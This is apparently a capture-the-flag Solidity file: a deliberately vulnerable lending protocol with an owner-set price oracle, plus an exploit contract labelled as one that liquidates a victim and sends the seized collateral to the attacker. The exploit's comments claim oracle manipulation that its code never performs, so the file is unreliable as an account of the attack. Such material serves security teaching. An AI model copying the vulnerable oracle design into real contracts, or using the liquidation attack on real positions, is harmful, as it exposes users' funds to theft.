// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

/**
 * @title SimplePriceOracle
 * @notice A simple price oracle that can be manipulated.
 */
contract SimplePriceOracle {
    mapping(address => uint256) public prices;
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function setPrice(address token, uint256 price) external {
        require(msg.sender == owner, "Not owner");
        prices[token] = price;
    }

    function getPrice(address token) external view returns (uint256) {
        return prices[token];
    }
}

/**
 * @title Liquidatooor (Secureum CTF)
 * @notice A simplified lending protocol with liquidation functionality.
 *         Vulnerability: Price oracle manipulation allows unfair liquidations.
 */
contract Liquidatooor {
    using SafeERC20 for IERC20;

    struct Position {
        uint256 collateral;
        uint256 debt;
    }

    IERC20 public collateralToken;
    IERC20 public debtToken;
    SimplePriceOracle public oracle;

    uint256 public constant LIQUIDATION_THRESHOLD = 150; // 150% collateralization
    uint256 public constant LIQUIDATION_BONUS = 10; // 10% bonus for liquidators

    mapping(address => Position) public positions;

    event Deposited(address indexed user, uint256 amount);
    event Borrowed(address indexed user, uint256 amount);
    event Repaid(address indexed user, uint256 amount);
    event Liquidated(address indexed user, address indexed liquidator, uint256 debtRepaid, uint256 collateralSeized);

    constructor(address _collateralToken, address _debtToken, address _oracle) {
        collateralToken = IERC20(_collateralToken);
        debtToken = IERC20(_debtToken);
        oracle = SimplePriceOracle(_oracle);
    }

    function depositCollateral(uint256 amount) external {
        collateralToken.safeTransferFrom(msg.sender, address(this), amount);
        positions[msg.sender].collateral += amount;
        emit Deposited(msg.sender, amount);
    }

    function borrow(uint256 amount) external {
        positions[msg.sender].debt += amount;
        require(_isHealthy(msg.sender), "Undercollateralized");
        debtToken.safeTransfer(msg.sender, amount);
        emit Borrowed(msg.sender, amount);
    }

    function repay(uint256 amount) external {
        debtToken.safeTransferFrom(msg.sender, address(this), amount);
        positions[msg.sender].debt -= amount;
        emit Repaid(msg.sender, amount);
    }

    function liquidate(address user, uint256 debtToRepay) external {
        require(!_isHealthy(user), "Position is healthy");

        Position storage position = positions[user];
        require(debtToRepay <= position.debt, "Too much debt");

        // Repay debt
        debtToken.safeTransferFrom(msg.sender, address(this), debtToRepay);
        position.debt -= debtToRepay;

        // Calculate collateral to seize (with bonus)
        uint256 collateralPrice = oracle.getPrice(address(collateralToken));
        uint256 debtPrice = oracle.getPrice(address(debtToken));

        uint256 collateralToSeize = (debtToRepay * debtPrice * (100 + LIQUIDATION_BONUS)) /
            (collateralPrice * 100);

        require(collateralToSeize <= position.collateral, "Not enough collateral");
        position.collateral -= collateralToSeize;

        collateralToken.safeTransfer(msg.sender, collateralToSeize);

        emit Liquidated(user, msg.sender, debtToRepay, collateralToSeize);
    }

    function _isHealthy(address user) internal view returns (bool) {
        Position storage position = positions[user];
        if (position.debt == 0) return true;

        uint256 collateralValue = position.collateral * oracle.getPrice(address(collateralToken));
        uint256 debtValue = position.debt * oracle.getPrice(address(debtToken));

        return (collateralValue * 100) >= (debtValue * LIQUIDATION_THRESHOLD);
    }

    function getHealthFactor(address user) external view returns (uint256) {
        Position storage position = positions[user];
        if (position.debt == 0) return type(uint256).max;

        uint256 collateralValue = position.collateral * oracle.getPrice(address(collateralToken));
        uint256 debtValue = position.debt * oracle.getPrice(address(debtToken));

        return (collateralValue * 100) / debtValue;
    }
}

/**
 * @title LiquidatooorAttack
 * @notice Exploit: Manipulate the oracle price to make a healthy position
 *         appear undercollateralized, then liquidate it for profit.
 */
contract LiquidatooorAttack {
    Liquidatooor public protocol;
    SimplePriceOracle public oracle;
    IERC20 public collateralToken;
    IERC20 public debtToken;
    address public owner;

    constructor(address _protocol) {
        protocol = Liquidatooor(_protocol);
        oracle = protocol.oracle();
        collateralToken = protocol.collateralToken();
        debtToken = protocol.debtToken();
        owner = msg.sender;
    }

    function attack(address victim, uint256 debtAmount) external {
        // If we have oracle control, manipulate price
        // Then liquidate the victim
        debtToken.approve(address(protocol), debtAmount);
        protocol.liquidate(victim, debtAmount);

        // Transfer seized collateral to owner
        collateralToken.transfer(owner, collateralToken.balanceOf(address(this)));
    }
}
